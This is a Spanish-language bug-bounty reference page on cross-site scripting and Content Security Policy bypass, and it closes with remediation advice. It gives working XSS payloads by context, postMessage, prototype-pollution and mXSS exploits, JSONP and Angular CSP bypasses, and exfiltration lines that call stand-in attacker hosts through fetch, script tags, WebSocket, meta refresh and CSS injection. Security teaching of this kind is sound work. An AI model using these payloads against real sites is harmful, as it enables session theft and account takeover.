---
title: "XSS y bypass de CSP"
description: "Ejecución de JS arbitrario en el navegador de la víctima en el origen del target."
category: "Web"
date: 2026-07-18
---
# 💉 XSS y bypass de CSP

Ejecución de JS arbitrario en el navegador de la víctima en el origen del target. Impacto real = robo de sesión/token, acciones en nombre de la víctima, ATO.

## Los tres tipos

| Tipo | Origen | Persistencia | Severidad típica |
|------|--------|--------------|------------------|
| **Reflejado** | Input en la request se refleja en la response | No | Medium |
| **Almacenado** | Payload guardado y servido a otros usuarios | Sí | High-Critical |
| **DOM-based** | Sink JS del lado cliente (`innerHTML`, `eval`) | Depende | Medium-High |

## Dónde buscar

- Reflejo de parámetros en HTML / atributos / `<script>` / JSON.
- Campos guardados: perfil, comentarios, nombre, `filename` de uploads.
- Sinks DOM: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(str)`, `location`, `{@html}` (Svelte), `dangerouslySetInnerHTML` (React), `v-html` (Vue).
- Fuentes DOM: `location.hash`, `location.search`, `document.referrer`, `postMessage`.

## Payloads por contexto

```html
<!-- HTML body -->
"><svg onload=alert(document.domain)>
<!-- Atributo -->
" autofocus onfocus=alert(document.domain) x="
<!-- Dentro de <script> -->
';alert(document.domain)//
<!-- URL / href -->
javascript:alert(document.domain)
<!-- Sin paréntesis / filtros -->
<svg onload=alert`1`>
<img src=x onerror=alert(document.domain)>
```

### Contextos adicionales

```html
<!-- Dentro de JSON embebido: <script>var data = {"name":"INJECT"};</script> -->
"}</script><img src=x onerror=alert(document.domain)>

<!-- JS template literals (backticks): var msg = `Hola ${nombre}` -->
${alert(document.domain)}

<!-- SVG (inline o subido como fichero) -->
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject><body xmlns="http://www.w3.org/1999/xhtml">
    <img src=x onerror=alert(document.domain)>
  </body></foreignObject>
</svg>

<!-- XML/XHTML (content-type application/xhtml+xml) -->
<![CDATA[<]]>script<![CDATA[>]]>alert(document.domain)<![CDATA[<]]>/script<![CDATA[>]]>

<!-- Markdown renderers (Marked, Showdown sin sanitize) -->
[click](javascript:alert(document.domain))
![x](x"onerror="alert(document.domain))
```

## DOM XSS en profundidad

### Sources y sinks comunes

| Sources (entrada controlable) | Sinks (ejecución peligrosa) |
|-------------------------------|----------------------------|
| `location.hash` / `.search` / `.href` | `innerHTML` / `outerHTML` |
| `document.referrer` | `document.write()` / `writeln()` |
| `document.cookie` | `eval()` / `Function()` / `setTimeout(str)` |
| `window.name` | `element.src` / `element.href` (asignación) |
| `postMessage data` | `jQuery.html()` / `$(selector)` |
| `Web Storage (localStorage)` | `location.assign()` / `script.textContent` |

### Explotación de postMessage

`postMessage` es un vector frecuente porque muchas apps confían en mensajes sin validar el origen.

```javascript
// Código vulnerable del target:
window.addEventListener("message", function(e) {
  // Sin validar e.origin
  document.getElementById("output").innerHTML = e.data.html;
});
// Exploit: targetWindow.postMessage({html:"<img src=x onerror=alert(1)>"},"*");
```

Buscar handlers que no verifican `e.origin` o usan checks parciales (`e.origin.indexOf("trusted.com")` se bypasea con `trusted.com.attacker.com`).

### Prototype pollution a XSS

Cuando una librería JS permite contaminar `Object.prototype`, se puede inyectar propiedades que terminan en un sink:

```javascript
// Pollution vía query param: ?__proto__[innerHTML]=<img src=x onerror=alert(1)>
// Si algún código hace: element.innerHTML = config.template || defaults.template
// y defaults hereda de Object.prototype → ejecución.
```

Gadgets conocidos en jQuery, Lodash, Backbone. Herramientas: **pp-finder**, **PPScan**.

## Blind XSS

El payload se almacena y se ejecuta en un contexto invisible para el atacante (panel admin, ticket interno, log viewer).

```html
"><script src=https://TU-SERVIDOR/probe.js></script>
"><img src=x onerror="fetch('https://TU-SERVIDOR/c?d='+document.domain)">
```

| Plataforma | Descripción |
|------------|-------------|
| **XSS Hunter** | Captura screenshots, cookies, DOM, URL al dispararse |
| **bxss.me** | Servicio ligero de callback para blind XSS |
| **Interactsh / Collaborator** | Confirmar ejecución vía DNS/HTTP OOB |

**Targets comunes**: formularios de soporte, campos User-Agent/Referer logueados en admin, nombres de archivo en uploads, campos de perfil vistos por moderadores.

## Mutation XSS (mXSS)

mXSS explota diferencias entre cómo un sanitizer parsea el HTML y cómo el navegador lo re-interpreta al insertarlo en el DOM.

```html
<!-- El sanitizer permite <math> pero el navegador re-parsea el contenido
     interno como HTML, no MathML -->
<math><mtext><table><mglyph><style><!--</style>
<img src=x onerror=alert(document.domain)>
```

DOMPurify ha parcheado múltiples variantes de mXSS. Versiones anteriores a 2.0.17 fueron vulnerables. Mantener siempre actualizado.

## Bypass de sanitizers y filtros

```
- Etiquetas raras: <details open ontoggle=…>, <math>, <marquee>
- Case / anidado: <ScRiPt>, <scr<script>ipt>
- Sin espacios: <svg/onload=…>
- Encoding: &#x6a; (HTML entities), j (JS unicode), doble URL
- mXSS: mutación al re-parsear (bypass DOMPurify antiguo)
- Ruptura de sanitizers ingenuos (ver **CTF Fluid Sheets**)
```

## Bypass de CSP

| CSP débil | Bypass |
|-----------|--------|
| `script-src 'self'` | Endpoint que refleja JS · JSONP con callback controlado · `<iframe srcdoc>` |
| `unsafe-inline` presente | Inyección inline directa |
| Dominio CDN confiable | Gadget/JSONP en ese CDN (`angular`, `jsonp`) |
| `nonce` reusado/predecible | Reutilizar nonce filtrado |
| Sin `object-src`/`base-uri` | `<base href>` hijack, plugins |

### JSONP gadgets en dominios confiables

Si la CSP permite `script-src *.google.com` o CDNs populares, existen endpoints JSONP que reflejan el callback:

```html
<!-- CSP: script-src 'self' *.google.com -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
```

Repositorio de referencia: **JSONBee** (lista de endpoints JSONP en dominios populares).

### Angular sandbox escape

Si la CSP confía en un CDN que sirve Angular < 1.6:

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(document.domain)')()}}</div>
```

### script-src con path traversal

CSPs por path (`script-src https://cdn.example.com/js/`) se bypasean si el servidor acepta `%2f`:

```html
<script src="https://cdn.example.com/js/..%2f..%2fuploads/evil.js"></script>
```

### base-uri hijack

Sin `base-uri 'none'`, se redirige la carga de scripts relativos:

```html
<base href="https://attacker.com/">
<!-- <script src="/js/app.js"> carga https://attacker.com/js/app.js -->
```

### object-src y meta refresh

- Sin `object-src 'none'`: cargar plugins Flash/PDF con JS embebido.
- Sin `connect-src` restrictivo: exfiltrar vía WebSocket (`new WebSocket("wss://attacker.com")`).
- Exfiltración sin JS: `<meta http-equiv="refresh" content="0;url=https://attacker.com/?data=TOKEN">`.
- CSS injection: `input[value^="a"]{background:url(https://attacker.com/?v=a)}` para leak de tokens CSRF.

### Trusted Types bypass

Trusted Types previene asignación directa a sinks DOM. Bypasses:
- Políticas `default` que no sanitizan correctamente.
- Librerías que crean políticas permisivas propias.
- `eval()` no está cubierto (requiere CSP `unsafe-eval` por separado).

## Herramientas

| Herramienta | Uso |
|-------------|-----|
| **csp-evaluator.withgoogle.com** | Evalúa CSP, señala debilidades y gadgets conocidos |
| **Burp CSP Auditor** (extensión) | Analiza headers CSP en respuestas interceptadas |
| **Burp + DOM Invader** | Detección de sinks/sources DOM automatizada |
| **XSStrike / Dalfox** | `dalfox url https://target/?q=FUZZ` |
| **Collaborator / interactsh** | Confirmar blind XSS (payload que llama a tu OOB) |
| **knoxss.me** | Servicio online de detección de XSS reflejado |

> [!warning] Verificación segura (Gate 3 del **Hunting Ejecutable**)
> PoC = `alert(document.domain)` o `console.log`, que prueba ejecución en el origen correcto. **No** exfiltres cookies/sesiones reales de terceros. Para blind XSS usa tu propio canal OOB.

## Chaining

```
XSS almacenado → robo de token/sesión → ATO
XSS + CSRF → forzar acción con token robado (ver **CSRF moderno**)
XSS via SVG/HTML upload → almacenado (ver **File Upload**)
XSS via WebSocket broadcast (ver **WebSocket Security**)
SSTI/second-order SQLi → XSS reflejado
XSS + postMessage → CSRF cross-origin sin token
XSS + Service Worker → persistencia (interceptar requests futuras)
XSS + OAuth → robar code/token de flujo OAuth (ver **Autenticacion Web**)
Prototype pollution → DOM XSS en librería vulnerable
Blind XSS en admin panel → escalada a admin / ATO del staff
CSS injection bajo CSP → exfiltrar tokens CSRF → CSRF clásico
```

## Reportes reales de referencia

- **Shopify** (2019): stored XSS en nombres de producto renderizado en dashboard admin sin escapar — ATO de merchant.
- **Google Maps** (VRP): DOM XSS vía `postMessage` sin validación de origen en maps.google.com.
- **HackerOne** (2017): XSS almacenado vía Markdown renderer que no sanitizaba enlaces `javascript:`.
- **Facebook** (2020): mXSS bypass del sanitizer propio al anidar `<math>` y `<svg>`.

> Consultar disclosed reports en HackerOne Hacktivity y Bugcrowd para payloads actualizados.

## Remediación (el fix para TI)

- **Output encoding contextual** (HTML/attr/JS/URL) — cada contexto requiere su encoding propio.
- Sanitizer robusto y mantenido (DOMPurify actual) para HTML enriquecido. Actualizar siempre.
- **CSP estricta**: `default-src 'self'`, nonces por request (no reusar), sin `unsafe-inline`, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'self'`.
- Cookies `HttpOnly` + `Secure` + `SameSite` para reducir impacto del robo.
- **Trusted Types**: activar con `require-trusted-types-for 'script'` para prevenir asignaciones a sinks DOM.
- Validar `e.origin` en todos los handlers de `postMessage`.
- Auditar dependencias JS (retire.js, npm audit) — librerías vulnerables son gadgets.
- `X-Content-Type-Options: nosniff` para evitar MIME sniffing de uploads como HTML.

## Relacionado
- **Autenticacion Web** — robo de token vía XSS → ATO
- **CSRF moderno** — cadena XSS + CSRF
- **File Upload** — SVG/HTML XSS almacenado
- **SSTI** — SSTI puede generar XSS reflejado
- **WebSocket Security** — XSS vía broadcast
- **Metodologia Bug Bounty** · **Hunting Ejecutable**
- **CTFs y Writeups** · **CTF Fluid Sheets**
- **Claude-BugHunter** (skill `hunt-xss`)
